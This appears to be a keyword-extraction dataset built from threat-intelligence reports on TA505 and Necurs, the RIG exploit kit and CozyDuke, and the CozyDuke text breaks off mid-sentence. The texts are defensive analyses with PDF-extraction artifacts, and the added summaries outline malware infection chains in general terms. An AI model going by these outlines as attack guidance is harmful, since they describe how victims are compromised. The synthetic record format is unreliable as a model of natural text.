[11][11][18][18][19][19] [11][19][20][37][27] [19]Canada, United StatesN/AGreece, Singapore,United Arab Emirates, Georgia,Sweden, LithuaniaOctober 2019United Kingdom, France, United StatesDecember 2019December 2019South KoreaGermany, NetherlandsN/AEducationJanuary-March 2020United StatesPharmaceuticalHealthcareRetailThe ﬁnancial sector used to be the exclusive target of the intrusion set before 2018 and has remained a regular target since.TA505 has however gradually expanded its victim proﬁle to other new sectors.20/08/2020Page 11 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal groupFrom a geographical point of view, all the continents are targeted by this intrusion set. A point of interest is the special attention TA505 seems to pay to South Korea. This interest could be linked to the fact that the intrusion set could have been working in connection with the Lazarus intrusion set as mentioned in chapter 3.20/08/2020Page 12 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group3 Links with other attacking groups 3.1 Clients Given its varied arsenal, the broadness of its targets, its sometimes massive, sometimes targeted campaigns, TA505 could well be a hacker-for-hire i.e. a provider of IS compromise and access qualiﬁcation services. Its clients will provide it with a list of potential targets which TA505 will try to compromise, to then sell these compromised or qualiﬁed accesses to clients.At least two potential clients have been identiﬁed by editors: the Lazarus intrusion set known to be tied to North Korean interests in open-sources and the Silence [38] group.3.1.1 Lazarus The simultaneous presence of Lazarus and TA505 has already been observed by different sources. In early January 2018, the Vietnamese CERT issued an alert relating to attacks targeting the ﬁnancial sector, combining indicators of compromise attributed to intrusion sets linked to North Korean interests in open-sources to others attributed to TA505 [39]. According to Lexfo, IOCs found simultaneously on bank networks and Powershell scripts, attributed to TA505 and to Lazarus, seem similar [40].Comment: As Dridex was used by Lazarus during the Bangladesh Bank heist in 2016, it is legitimate to query the prior opening of access by a cybercriminal group before the intrusion by Lazarus. [41].In addition, the speciﬁc targeting of South Korea by TA505 could indicate an order from a ﬁnal client such as an intrusion set known to be linked in open-sources to North Korean interests.3.1.2 Silence There are code and infrastructure links between FlawedAmmyy and Truebot (aka Silence.Downloader), a re- mote administration tool speciﬁc to Silence18. According to the Group-IB editor, FlawedAmmyy.downloader and Truebot were developed by the same individual [42]. Furthermore, Silence is thought to have attacked at least one bank in Europe via TA505 in order to compromise its IS [43].Comment: If Silence does indeed call on TA505 for the initial compromise, it would be to change the TTPs, as Silence, from its beginning, in 2016, is autonomous in the sending of phishing emails and initial compromise.3.2 FIN7 According to the Korean Financial Security Institute (FSI) [20], there are similarities between TA505 and the FIN7 cybercriminal group, the successor to Carbanak and now specialising in the theft of credit card information. The two groups are thought to:• share the IPs of joint C2 servers ; • use FlawedAmmyy, Cobalt Strike and TinyMet (BabyMetal for FIN7); • use batch script for internal recognition purposes; • be lateralised through the RDP protocol and PSExec; • use Shim Database (SDB) in the same way. This particularity is also highlighted by Proofpoint [19].Comment: FIN7 and TA505 could in fact be working together. It seems that the FSI observed that an infection chain in line with those of TA505 deployed malware targeting POS terminals (PoS systems), belonging to FIN7. 18Russian-speaking cybercriminal group specialising in compromising ATMs for fraudulent cash withdrawals [38].20/08/2020Page 13 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group4 ConclusionDespite the scale of its activity as an affiliate of Dridex and Locky, TA505 was only identiﬁed as such in 2017, at the same time as its ﬁrst uses of backdoors.Often mistaken for the Evil Corp cybercriminal group (operating the Dridex botnet and BitPaymer ransomware), and sometimes considered to be the operator of the Necurs botnet, TA505 uses a scalable attack arsenal which it implements in varied and sometimes simultaneous campaigns, casting confusion over its motives. As such, the ties it has with Lazarus and Silence suggest that TA505 conducts parallel campaigns for its own behalf and campaigns for its clients.The scale of its campaigns since 2019 and its targeting of several sectors in France, make this intrusion set a threat of special concern in 2020.20/08/2020Page 14 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group5 Appendix: the Necurs botnet 5.1 Return of the Necurs botnet The Necurs botnet (alias CraP2P) ﬁrst appeared in 2011 [44].Two known botnet modules are:• spam, used for example:– during pump and dump campaigns (especially relating to cryptoassets) as in March 2017; – in 2018, when Necurs acquired a new module .NET spamming [45]); – between 2016 and 2017, when Necurs propagated the Kegotip banking Trojan through The Uprate loader and The Rockloader19, (Loader used to recover email addresses available in hard disks and to use them in future spam campaigns [47];– after the dismantling of the Kelihos botnet in 2017, when Necurs was thought to have retrieved some ofits business, in particular consisting of dating spam.• proxy/DDoS (addition of the DoS module in February 2017) [3].The Necurs botnet communicates with its operators in different ways [48]:• Its main communication network consists of a list of IP addresses and static hard-coded domains in the sam-pling of Necurs malware;• If this method is not capable of obtaining an active C2, Necurs uses its domain generation algorithm (DGA): the main DGA produces 2048 C2 domains every 4 days. When Necurs operators record a DGA domain to inform bots of the existence of a new C2, the domain does not indicate the real IP address of the C2. This IP address is obfuscated with an encryption algorithm. All the domains are tried out until one of them matches and replies using the right protocol;• If this method also fails, the C2 domain is recovered on the P2P network.Furthermore, the C2 infrastructure is divided into three levels. The last is the C2 backend. In this way, an infected system communicates with at least two layers of the C2 proxy when it is trying to communicate with the C2 backend. The ﬁrst C2 layer consists of cheap private virtual servers located in countries like Russia or the Ukraine whereas the second layer is usually hosted in Europe, sometimes Russia. There are thought to be 11 Necurs botnets, i.e. 11 C2 backends, tightly controlled by one single group [4]. Four of these botnets represent 95% of all infections [48, 49].5.2 Massive distribution by Necurs From 2016 to 2019, Necurs was the most frequently used method to deliver spams and malware for cybercriminals, and responsible for 90% of malware distributed by email worldwide. 1 million systems were infected in 2016 rising to 9 million on 10 March 2020 [49].Between 2016 and 2017, Necurs mainly distributed Locky, Jaff (copy cat of Locky, GlobeImposter, Philadelphia, Lukitus and Ykcol (variants of Locky) and Scarab ransomware, as well as Dridex and TrickBot banking Trojans.As of August 2018, Necurs started to roll out phishing campaigns targeting ﬁnancial institutions, while continuing its massive propagation of (FlawedAmmyy, Quant Loader, AZOrult, ServHelper) malware, a majority of which belongs to TA505’s arsenal.In 2020, Necurs lost clients to Emotet, which replaced it in the distribution of Dridex and TrickBot [50], and dis- tributed massive get-rich-quick spam campaigns. Its daily infections are mainly located in India, Indonesia, Iran, 19Loader used during compromises to propagate Locky, Dridex 220, Pony and Kegotip ransomware [46].20/08/2020Page 15 of 20TLP:WHITETLP:WHITEMexico, Turkey, Vietnam and Thailand. 4892 infections have been located in France. [48, 49].Development of the activity of the TA505 cybercriminal groupTA505 is thought to have massively distributed malware via the Necurs botnet, to such an extent that it is possible that the group actually operates this botnet, or at least is very closely tied to its real operator.Comment: although it is possible that TA505 and the operator of the Necurs botnet have been mistaken for each other, it appears that the open-source tends to attribute all campaigns propagated by Necurs to TA505 through to at least late 2017 (pump-and-dump spam campaigns and other frauds being excluded), whereas it is a gigantic botnet probably used by cybercriminal groups other than TA505. Indeed, users of remote-controlled botnets, are often capable of renting out access to segments of their botnet on the black market to send DDoS, span campaigns etc.20/08/2020Page 16 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group6 Bibliography[1] Proofpoint. Threat Actor Proﬁle: TA505, From Dridex to GlobeImposter. Sept. 27, 2017. URL: url proofpoint.com/us/threat- insight/post/threat- actor- profile- ta505- dridex- globeimposter (visited on 05/03/2019).[2] CERT-FR, “Le Code Malveillant Dridex : Origines et Usages”. In: (May 25, 2020). [3] BITSIGHT, Dridex: Chasing a Botnet from the Inside. Jan. 1, 2015. [4] Bit Sight. Dridex Botnets. Jan. 24, 2017. URL: url (visited on04/09/2020).[5] TWITTER, “@Kafeine”. In: (Jan. 1, 2019). [6] Secureworks. Evolution of the GOLD EVERGREEN Threat Group. May 15, 2017. URL: url (visited on 04/24/2020).[7] PROOFPOINT, “High-Volume Dridex Banking Trojan Campaigns Return”. In: (Apr. 4, 2017). [8] Palo Alto. Locky: New Ransomware Mimics Dridex-Style Distribution. Feb. 16, 2016. URL: url paloaltonetworks . com / locky - new - ransomware - mimics - dridex - style - distribution/ (visited on 04/24/2020).[9] Proofpoint. TA505 Shifts with the Times. June 8, 2018. URL: url (visited on 11/20/2019).[10] SENSEPOST, “Macro-Less Code Exec in MSWord”. In: (Oct. 9, 2017). [11] Trend Micro. Latest Spam Campaigns from TA505 Now Using New Malware Tools Gelup and FlowerPippi - Trend- Labs Security Intelligence Blog. July 4, 2019. URL: url intelligence/latest- spam- campaigns- from- ta505- now- using- new- malware- tools- gelup- and- flowerpippi/ (visited on 11/27/2019).[12] KOREA INTERNET & SECURITY AGENCY, KISA Cyber Security Issue Report : Q2 2019. Aug. 13, 2019. [13] FireEye. STOMP 2 DIS: Brilliance in the (Visual) Basics. Feb. 5, 2020. URL: url threat - research / 2020 / 01 / stomp - 2 - dis - brilliance - in - the - visual - basics . html (visited on 04/09/2020).[14] Proofpoint. Leaked Ammyy Admin Source Code Turned into Malware. Mar. 7, 2018. URL: https : / / www .proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware.[15] PROOFPOINT, “TA505 Abusing SettingContent-Ms within PDF Files to Distribute FlawedAmmyy RAT”. In:(July 19, 2018).[16] PROOFPOINT, “tRat: New Modular RAT Appears in Multiple Email Campaigns”. In: (Nov. 15, 2018). [17] PROOFPOINT, “ServHelper and FlawedGrace - New Malware Introduced by TA505”. In: (Jan. 9, 2019). [18] Trend Micro. TA505 At It Again: Variety Is the Spice of ServHelper and FlawedAmmyy. Aug. 27, 2019. URL: url is-the-spice-of-servhelper-and-flawedammyy/ (visited on 04/24/2020).[19] Proofpoint. TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader. Oct. 15, 2019. URL: url access-trojan-get2-downloader (visited on 11/19/2019).[20] KOREAN FINANCIAL SECURITY INSTITUTE, “Proﬁling of TA505 Threat Group”. In: (Feb. 28, 2020). [21] MICROSOFT SECURITY INTELLIGENCE, “Mise à Jour Dudear”. In: (Jan. 30, 2020). [22] PROOFPOINT, “New Modular Downloaders Fingerprint Systems, Prepare for More - Part 1: Marap”. In: (Oct. 16,2018).[23] Trend Micro. Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. June 12, 2019. URL: url security- intelligence/ shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in- latest-campaigns/ (visited on 04/09/2020).20/08/2020Page 17 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group[24] Proof Point. TA505 Begins Summer Campaigns with a New Pet Malware Downloader, AndroMut, in the UAE, South Korea, Singapore, and the United States. July 2, 2019. URL: url insight/post/ta505-begins-summer-campaigns-new-pet-malware-downloader-andromut-uae-south (visited on 04/09/2020).[25] Cyberint. Legit Remote Admin Tools Turn into Threat Actors’ Tools. Jan. 1, 2019. URL: url hubfs/Report%20Legit%20Remote%20Access%20Tools%20Turn%20Into%20Threat%20Actors%20Tools/ CyberInt _ Legit % 20Remote % 20Access % 20Tools % 20Turn % 20Into % 20Threat % 20Actors % 27 % 20Tools _ Report.pdf (visited on 04/24/2020).[26] Blueliv. TA505 Evolves ServHelper, Uses Predator The Thief and Team Viewer Hijacking. Dec. 17, 2019. URL: https : / / www . blueliv . com / cyber - security - and - cyber - threat - intelligence - blog - blueliv / research/servhelper-evolution-and-new-ta505-campaigns/ (visited on 04/09/2020).[27] US-Cert. COVID-19 Exploited by Malicious Cyber Actors. Apr. 8, 2020. URL: url (visited on 04/24/2020).[28] FOX IT Reactie Universiteit Maastricht Op Rapport FOX-IT. Feb. 5, 2020. [29] Bleeping Computer. Three More Ransomware Families Create Sites to Leak Stolen Data. Mar. 24, 2020. URL: url more- ransomware- families- create- sites-to-leak-stolen-data/ (visited on 04/09/2020).[30] ANSSI, “Informations Concernant Le Rançongiciel Clop”. In: (Nov. 22, 2019). [31] Deutsch Telekom. TA505’s Box of Chocolate - On Hidden Gems Packed with the TA505 Packer. Mar. 26, 2020. URL: url 597672 (visited on 04/09/2020).[32] Cyware. The Many Faces and Activities of Ever-Evolving Necurs Botnet. Dec. 29, 2019. URL: url com/news/the-many-faces-and-activities-of-ever-evolving-necurs-botnet-1e8d2734 (visited on 04/16/2020).[33] MORPHISEC, “Morphisec Uncovers Global “Pied Piper” Campaign”. In: (Nov. 29, 2018). [34] PROOFPOINT, “TA505 Targets the US Retail Industry with Personalized Attachments”. In: (June 12, 2018). [35] Cybereason. Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Apr. 25, 2019. URL: url actor- ta505- targets- financial- enterprises-using-lolbins-and-a-new-backdoor-malware (visited on 04/09/2020).[36] Yoroi. TA505 Is Expanding Its Operations. May 29, 2019. URL: url (visited on 04/09/2020).[37] BLEEPING COMPUTER, “Ransomware Hits Maastricht University, All Systems Taken Down”. In: (Dec. 27, 2019). [38] CERT-FR, “Le Groupe Cybercriminel Silence”. In: (May 7, 2020). [39] Norfolk Infosec. OSINT Reporting Regarding DPRK and TA505 Overlap. Apr. 10, 2019. URL: url (visited on 04/09/2020).[40] LEXFO, The Lazarus Constellation. Feb. 19, 2020. [41] Nice Ideas. Deciphering the Bangladesh Bank Heist. Jan. 27, 2020. URL: url (visited on 01/27/2020).[42] GROUP-IB, “SILENCE 2.0”. In: (Aug. 1, 2019). [43] Group-IB. Group-IB: New Financially Motivated Attacks in Western Europe Traced to Russian-Speaking Threat Actors. Mar. 27, 2020. URL: url ib.com/media/silence_ta505_attacks_in_europe/ (visited on 04/24/2020).[44] Twitter. @Kafeine. Apr. 24, 2020. URL: url (visited on04/24/2020).[45] Threatpost. Necurs Botnet Evolves to Hide in the Shadows, with New Payloads. Jan. 27, 2020. URL: url (visited on 01/27/2020).[46] Proofpoint. Locky Ransomware: Dridex Actors Get In The Game. Apr. 6, 2016. URL: url com/us/threat-insight/post/dridex-actors-get-in-ransomware-with-locky (visited on 04/24/2020).20/08/2020Page 18 of 20TLP:WHITETLP:WHITEDevelopment of the activity of the TA505 cybercriminal group[47] Security Intelligence. The Necurs Botnet: A Pandora’s Box of Malicious Spam. Apr. 24, 2017. URL: https:// securityintelligence.com/the- necurs- botnet- a- pandoras- box- of- malicious- spam/ (visited on 04/24/2020).[48] BitSight. Joint Effort with Microsoft to Disrupt Massive Criminal Botnet Necurs. Mar. 10, 2020. URL: https : //www.bitsight.com/blog/joint-effort-with-microsoft-to-takedown-massive-criminal-botnet- necurs (visited on 04/24/2020).[49] The Shadowserver foundation. Has The Sun Set On The Necurs Botnet? Mar. 15, 2020. URL: url (visited on 04/24/2020).[50] Threatpost. As Necurs Botnet Falls from Grace, Emotet Rises. Jan. 29, 2020. URL: url (visited on 01/29/2020).20/08/2020Page 19 of 20TLP:WHITE- 20/08/2020 Open License (Étalab - v2.0)AGENCE NATIONALE DE LA SÉCURITÉ DES SYSTÈMES D’INFORMATIONANSSI - 51 boulevard de la Tour-Maubourg, 75700 PARIS 07 SP www.cert.ssi.gouv.fr / cert-fr.cossi@ssi.gouv.fr ","{'phrases': ['TA505', 'phishing emails', 'attachments', 'social engineering', 'Documents', 'macros', 'command and control servers', 'Malware', 'access', 'Trojans', 'FlawedAmmyy', 'SDBbot', 'scripts', 'reconnaissance', 'PowerSploit', 'credentials', 'Mimikatz', 'RDP', 'the network', 'Ransomware', 'data', 'May', 'tRat', 'infrastructure', 'Shifts', 'Rapid', 'campaigns', 'detection', 'Payloads', 'compromise', 'attacks'], 'target': 'TA505; phishing emails; attachments; social engineering; Documents; macros; command and control servers; Malware; access; Trojans; FlawedAmmyy; SDBbot; scripts; reconnaissance; PowerSploit; credentials; Mimikatz; RDP; the network; Ransomware; data; May; tRat; infrastructure; Shifts; Rapid; campaigns; detection; Payloads; compromise; attacks.'}"
RIG; visitors; websites; Malvertising; users; the site; a GET request; the GET request; a service; C2; addition; malware; system info; remote shell; RIG payload; addition; data; 10; techniques; 11; users; activity; the exploit kit; the user; the kit; 10; service.,"["" 1. Users are redirected to RIG landing pages via malicious iframes injected into legitimate websites or malvertising. 2. The landing page probes the victim's browser and delivers an exploit, such as for a Flash vulnerability. 3. The exploit kit makes a separate GET request to download the malicious payload onto the victim's machine. 4. The payload executes and installs spambot malware disguised as legitimate Windows services. 5. The spambot malware sends spam emails from the infected machine. ""]","Extract the keywords: THURSDAY,JANUARYRIGGING COMPROMISE - RIG EXPLOIT KITThis post was authored by Nick Biasini with contributions by Joel Esler.Exploit Kits are one of the biggest threats that affects users, both inside and outside the enterprise, as it indiscriminately compromises simply by visiting a web site, delivering a malicious payload. One of the challenges with exploit kits is at any given time there are numerous kits active on the Internet. RIG is one of these exploit kits that is always around delivering malicious payloads to unsuspecting users. RIG ﬁrst appeared in our telemetry  back in November of 2013, back then we referred to it as Goon, today it's known as RIG.We started focusing on RIG and found some interesting data similar to what we found while analyzing Angler. This post will discuss RIG, ﬁndings in the data, and what actions  were taken as a result.THE EXPLOIT KIT OVERVIEWRIG compromises users like any exploit kit. It starts with a user being redirected to a landing page. This is done via malicious iframes or malvertising and looks similar the following:It begins with an initial link to a javascript:Then when the browser is redirected it receives the following:This page is just a simple iframe that retrieves the actual landing page. The request for the landing page looks like:When the user is actually delivered a landing page, it is highly obfuscated and lacks some of the English based text we see in other exploit kits. Below is a small sample of the obfuscated landing page:After probing the browser RIG delivers an exploit to the end user. Below is an example of ﬂash exploit that RIG was delivering: One interesting aspect of RIG is the actual payload is obtained in a separate GET request. We usually see the exploit and payload delivered together or at least delivered in a highly obfuscated manner, not a GET request delivering an actual executable. This is not the case for RIG. Below is a sample of the GET request for the malicious payload:A ﬁnal interesting aspect to RIG is the naming convention for the payloads on the end  system. RIG tries to hide as legitimate services on Windows platforms. Common examples included defsrag.exe, dissdkchk.exe, systemrestore.exe. These are designed to look similar to defrag, diskchk, and the system restore functionality in Windows. However, in all cases these ﬁles were dropped in to TEMP folders instead of SYSTEM32 where they  would be expected to be located.THE DATARIG exploit kit is steadily compromising users, below is a sample of the data we gathered over two months related to systems serving RIG exploit kit. Users were being driven to RIG through malicious iframes and malvertising. The overall volume of activity was lower, affecting hundreds of users, instead of the thousands we saw impacted by Angler.DOMAIN ACTIVITYAn analysis of the data associated with RIG revealed some familiar patterns. First was the use of domain shadowing. We found that domain shadowing is currently being used exclusively to host RIG, unlike with Angler, we were unable to ﬁnd other domain activity  during the two month period. This particular use of domain shadowing has interesting aspects related to the subdomains themselves. RIG is using very short string based subdomains ranging from english based words like admin, user, news, and server. Also present was short random strings like qwe21, qwe23, htr43, and htr43. Leveraging the IP addresses found we were able to identify in excess of 7000 subdomains being used byaddresses found we were able to identify in excess of 7000 subdomains being used by RIG over several months. The activity was spread evenly among those subdomains with few having more than 10 hits in the months of activity and the majority having less than ﬁve. REFERERSRIG, like most exploit kits, is getting users infected via the use of malicious iframes injected in websites and malvertising. There were a couple of interesting things that we observed in the data. First is the use of Google and Bing in the redirection chain. We have seen this before in Nuclear exploit kit and this will provide an extra layer in the chain to help ensure users are getting to the landing pages. The second interesting fact dealt with the volume, there were more than 60 unique referers observed over the two month period but the average volume was low with most having less than ﬁve entries. EXPLOITS During the two month period shown here we saw RIG using Flash to compromise systems. The primary exploit being used was CVE-2015-5119. We saw a total of 30 unique hashes being used to compromise systems during the two month period. 70% of those hashes were known by VirusTotal and had some protection from an AV perspective. Despite that users were still being compromised and malicious payloads were being delivered.PAYLOADS The most common exploit kit payload today is overwhelmingly ransomware, RIG however,The most common exploit kit payload today is overwhelmingly ransomware, RIG however, was decidedly different it was exclusively delivering spambot variants. The most common payload were variants of Tofsee which is a spam botnet. The way these payloads work is by sending large amounts of spam email related to various topics. Spambot payloads were very common to exploit kits several years ago, but most have moved on to payloads that guarantee quick monetization. The use of these payloads by RIG is an interesting differentiator from other exploit kits Talos has been observing.Most of the payloads we found had very good detection on VirusTotal with most being detected by more than half of the AV vendors. Again, despite this RIG continues to successfully compromise users that are primarily using versions of Internet Explorer on Windows platforms, based on the user agent information.IP InfrastructureThis is the most interesting aspect of our RIG research. We observed 44 different IP addresses delivering some form of RIG. As shown above you can see that on most days there were only one or two IP's actively hosting RIG.When we resolved the IP's to the associated ASN we found something surprising. With the exception of a single IP address all IP's belonged to the same ASN (35415).This particular ASN is associated with Webzilla, a provider out of Russia. Further investigation actually revealed that all of the addresses were leased to Eurobyte, which is another Russian provider. Talos reached out to both providers giving them the information regarding the hosts that we observed serving RIG. Webzilla responded and identiﬁed the  customers that were generating the events and blocked the hosts successfully. Below is a graph showing the RIG activity we observed during our investigation:Monitoring the amount of RIG activity after our notiﬁcation, we have consistently seen new  servers that are being hosted by Eurobyte being stood up and compromising users via RIG. We again reached out to Eurobyte to try and get a response directly from the provider where the malicious activity is being hosted. Despite multiple emails to Eurobyte RIG activity continued as new addresses get stood up after being reported to WebZilla. This underscores one of the major problems we face today, leaf providers. As providers could have multiple downstream leaf providers we ﬁnd that we routinely have success in  dealing with larger providers. These providers help get systems shut down, but without the cooperation of the smaller downstream providers the adversaries just stand up new servers and move on. We were able to inﬂict some damage to RIG during our  investigation, but were unable to actually get the actors behind the activity stopped.RESPONSESince Eurobyte chose not to acknowledge or respond to our repeated messages we did a little further research on the activity associated with the provider. We worked with our research partners at OpenDNS Labs to get better visibility into the domains that were hosted. Based on our research we found a total of seven class C networks owned by the provider, with one of the class C's serving as their corporate network. Based on the information from OpenDNS provided we found approximately 25,000 domains being hosted on this address space. These domains were heavily leveraging the Russian TLD (.ru), as expected. Three of the class C networks were seen serving RIG during the period. We took the domains that OpenDNS provided and queried them against Talos’s automated web reputation. We found that of the six class C address spaces that are being used by Eurobyte ﬁve were scored signiﬁcantly negatively in web reputation. The only   exception was one Class C network that was hosting the Russian payment platform e- autopay<dot>com.Based on all this information and Eurobytes failure to respond or even acknowledge abuse requests Talos and OpenDNS have decided to blacklist the ﬁve suspect subnets for a  period of 30 days. After this time Talos and OpenDNS will re-evaluate the provider to determine if an extended blacklisting should occur. This activity will add all the IP's in thedetermine if an extended blacklisting should occur. This activity will add all the IP's in the address spaces to Cisco's IP and Domain intelligence blacklists. These blacklists are leveraged by multiple Cisco security products and will effectively protect our customers from any activity from this provider. This includes all technologies that consume our reputation services. The advantage of these blacklists, as well as our Advanced Malware Protection with our fantastic AMP line of products is, this detection adapts and changes in real time to the threat.Additionally, after reviewing the data provided by OpenDNS we worked with them to make sure that the threat was mitigated from their perspective as well. We found that the majority of the address space was already being blocked by OpenDNS, but we were able to round out the protection and make sure that Eurobyte won't be serving malicious content to both Cisco and OpenDNS customers. For additional information on how OpenDNS has been tracking RIG please see the following blog from the most recent talk at Brucon.DETECTIONTalos’s unparalleled visibility into threat data allows us to automatically adjust protection for our customers based upon real-world visibility into data. Convicting IPs, Domains, affecting the reputation of ﬁles in our AMP products, easily turning any of our data  collection systems against each other, each updating quickly to protect every single one of Cisco’s security customers against the threat in real-time, and continuously.IOCIP INFORMATION has been largely focused on Angler in 2015, now Angler seems to be on a temporary vacation since the end of 2015. This is expected with the sophistication, scope, and innovation that Angler incorporates. However, as evidenced by this research, it doesn't take innovation and sophistication to compromise users. RIG exploit kit is steadily and consistently compromising users and delivering malicious payloads. Visibility into the other exploit kits is valuable and necessary to help shed light on the behavior and identify the providers they are leveraging to help protect and educate the community.Additionally, this research shed light on the problem of leaf providers. Providers are in a tough spot with lots of systems and limited resources. That was one of the driving force behind Project Aspis, to help aid providers by providing resources to help them identify and mitigate these threats. It's understandable that malicious activity is going to occur at hosting providers. It's impossible for them to know the intentions of a customer when they are purchasing systems. At the same time when a provider is notiﬁed of malicious activity  it is their responsibility to at least acknowledge the abuse and work to validate and, if legitimate, take the system ofﬂine. Webzilla did just that in our experience, but Eurobyte  has not. This lack of response lead Talos to make the decision to blacklist large portions of the provider's network to ensure that our customers are protected since reporting the abuse alone is not enough.COVERAGEAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.to detect malicious network activity by threat actors.The Network Security protection of IPS and NGFW have up-to-date signaturesP TETHIS2 COMMENTS:CONRAD LONGMORE JANUARY 9, 2016 AT 6:15 PMAs it happens, I'm just running an analysis on sites hosted by Eurobyte LLC either currently on in the past, using a somewhat different data set. So far, out of 7500 sites analysed, 35% are tagged by Google as being malicious. This probably means that many of the other 65% are also bad, but they just haven't been tagged.The Eurobyte LLC range is actually a bit bigger than you specify, they rent the since they were either hosting legitimate activity or were the corporate address space for Eurobyte.ReplyEnter your comment Enter your comment Comment as: Select profile Publish PublishPreview PreviewPOST A COMMENTN NUARYResearch Spotlight: Needles in a Haystack Microsoft Patch Tuesday - January 2016 Rigging compromise - RIG Exploit Kit► 2 Cisco Partner Weekly Rewind – January 22, 2016 Snort Subscriber Rule Set Update for 01/21/2016 C ClamAV 0.99 Release is the largest ever!TANLVOARMENLODGEDBLOGSLOBGLOG®Software CommunityVulnerability Reports Additional ResourcesMicrosoft to SID Mapping Archive Shared Object Rule GeneratorIP Blacklist DownloadAWBO ExercisesAbout Talos Join Our TeamContact BlogCONNECT WITH US© 2015 Cisco Systems, Inc. and/or its afﬁliates. All rights reserved. View our  Privacy Policy here. ","{'phrases': ['users', 'RIG', 'malicious iframes', 'websites', 'the landing page', 'an exploit', 'Flash', 'The exploit kit', 'a separate GET request', 'the malicious payload', 'The payload', 'malware', 'Windows', 'spam email'], 'target': 'users; RIG; malicious iframes; websites; the landing page; an exploit; Flash; The exploit kit; a separate GET request; the malicious payload; The payload; malware; Windows; spam email.'}"
email; the victim; a link; a compromised website; a ZIP file; the user; the file; executes; CozyDuke; the victim; a decoy; the malware; access; additional modules; the group; MiniDuke; OnionDuke; MiniDuke; OnionDuke; control; servers; access; lateral movement; data; systems; infrastructure; MiniDuke; OnionDuke; MiniDuke; OnionDuke.,"["" 1. The threat actor sends phishing emails with links to zip files hosted on compromised sites. 2. The victim downloads and executes the zip file containing a CozyDuke dropper disguised as a self-extracting RAR archive. 3. The dropper extracts and executes the CozyDuke components along with an encrypted configuration file. 4. The CozyDuke main component DLL establishes command and control communication to receive tasks from the threat actor's server. 5. CozyDuke can load additional modules sent by the C2 server to extend its capabilities. 6. It can also drop other malware tools, scripts, and executables as instructed by the C2. 7. These additional executables implement their own C2 protocols to exfiltrate data from the compromised system. 8. CozyDuke sets up persistence mechanisms like registry run keys, services, and COM hijacking to maintain access. 9. Finally, sensitive data is exfiltrated from the victim's network back to the threat actor's infrastructure. ""]","Extract the keywords: COZYDUKETLP: WHITECONTENTSIntroduction The CozyDuke toolset Attack overviewInfection vector Attribution & linksTechnical Details Initial infection CozyDuke main dropper CozyDuke main componentOverview Command and control communication CozyDuke Terminology and Naming Appendix A | Sample hashes Appendix B: IOCs2 9This whitepaper provides an overview of CozyDuke, a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations, such as governmental organizations and other entities that work closely with these institutions.The CozyDuke toolset, which we believe has been under active development since at least 2011, consists of tools for infecting targeted hosts, establishing and maintaining backdoor access to the hosts, gathering information from them and gaining further access to other hosts inside the victim organization.Based on command and control (C&C) server information found being used by CozyDuke tools, we believe the CozyDuke toolset is used by at least one malicious actor who also uses, or at the least shares, infrastructure with actors using the known threats, MiniDuke and OnionDuke.F-SECURE LABS Whitepaper2INTRODUCTIONTarget detailsTHE COZYDUKE TOOLSET CozyDuke, as referred to in this document, is a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations. The core of the CozyDuke toolset is a modular attack platform consisting of a main component augmented by a set of additional modules implementing further functionality. The CozyDuke toolset also includes multiple kinds of droppers for infecting hosts with CozyDuke or for executing additional tools from the CozyDuke toolset. Finally, the CozyDuke toolset includes tools and scripts – some custom-written, others based on openly available tools – that are used for purposes such as gathering further information from infected hosts or for infecting additional hosts in the same target organization.ATTACK OVERVIEWInfection vector We have observed CozyDuke being spread via email, which usually contain a link to a compromised website hosting a ZIP file (although in at least one case, the file was hosted on Dropbox). These files contain an executable that, upon execution, will write to disk and execute CozyDuke, while at the same time presenting the user with a decoy to divert attention. The decoy is usually an uninteresting PDF, but we have also observed a Flash video of monkeys being presented as the decoy.We have reason to believe CozyDuke is being used to target governmental organizations and entities that work closely with such bodies.TimelineWe believe the current CozyDuke activity started at the end of January 2015. Most of the samples we have observed were compiled beginning from the end of January. However, based on comparisons of recent CozyDuke samples against older samples we have obtained dating back as far as the end of 2011, we believe CozyDuke has been under active development since at least 2011.Attribution & linksWe have strong evidence suggesting the group using CozyDuke is the same as - or at the least shares command and control infrastructure with - the group or groups using MiniDuke and OnionDuke. Firstly, a CozyDuke sample from February of 2012 attempts to contact a C&C server at nostressjob.com. This domain has previously been associated with known MiniDuke C&C infrastructure. This same infrastructure has also been seen in use by OnionDuke. Secondly, we also have reason to believe CozyDuke has, in some instances, downloaded and executed droppers for DLL files reminiscent of OnionDuke. Specifically, the DLLs dropped have used file and export names also used by OnionDuke. Additionally, the strings in the DLLs have been encrypted using the same algorithm used by OnionDuke. This link is, however, not as conclusive as the infrastructure overlap.FIGURE 1: C&C INFRASTRUCTURE CONNECTIONS BETWEEN COZYDUKE, MINIDUKE AND ONIONDUKECozyDukeMiniDukeOnionDukenostressjob.comgrouptumbler.comoverpict.compostmaster@grouptumbler.comJohn KasaiTECHNICAL DETAILSINITIAL INFECTION Infection with CozyDuke begins with the victim receiving an email containing a link to a ZIP file. This ZIP file will contain a single executable, usually a self-extracting RAR archive. Upon execution, it will write two files to disk. The first file is a decoy. The decoy has usually been a PDF document but Flash videos have also been observed in some cases. The second file extracted from the archive is a CozyDuke dropper. This dropper will then proceed to write to disk the main CozyDuke components as well as an encrypted configuration file used by CozyDuke.FIGURE 2: THE COZYDUKE INFECTION FLOWMalicious linkZIP fileDownloadsZIP fileExtractsSelf-extractingRARExtractsExtractsCozyDuke main dropperDecoy document3COZYDUKE MAIN DROPPER The main CozyDuke dropper, used for infecting hosts with CozyDuke, begins by checking whether the victim has an anti-virus product installed. Should an installed product be found, it will be compared to a predetermined list of product names. If the installed product 